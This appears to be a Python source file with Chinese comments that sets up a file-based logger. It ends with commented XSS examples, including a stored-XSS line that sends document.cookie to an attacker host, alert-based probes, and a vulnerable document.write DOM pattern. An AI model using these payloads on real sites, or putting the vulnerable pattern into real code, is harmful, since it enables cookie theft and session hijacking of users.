import logging

# 创建 logger 实例
logger = logging.getLogger("my_logger")


# 该文件用于实例化一个日志组件
def init_logger():
    print("开启日志记录")
    # 设置日志级别
    logging.basicConfig(level=logging.INFO)

    # 创建文件 handler，用于将日志写入到文件中
    handler = logging.FileHandler('test.log', encoding='utf-8')

    # 设置日志格式
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)

    # 将 handler 添加到 logger 中
    logger.addHandler(handler)


# http://www.example.com/search?q=<script>alert(document.cookie)</script> 反射性xss

# <script>document.location='http://attacker-site.com/?cookie='+document.cookie</script> 存储型xss

# var search = decodeURIComponent(location.search.slice(1));
# document.write(search); Dom型xss

# <a href="javascript:alert(document.cookie)">Click me</a> 嵌入式js攻击

# <input type="text" name="search" value="<script>alert(document.cookie);</script>"> 针对输入框的xss攻击
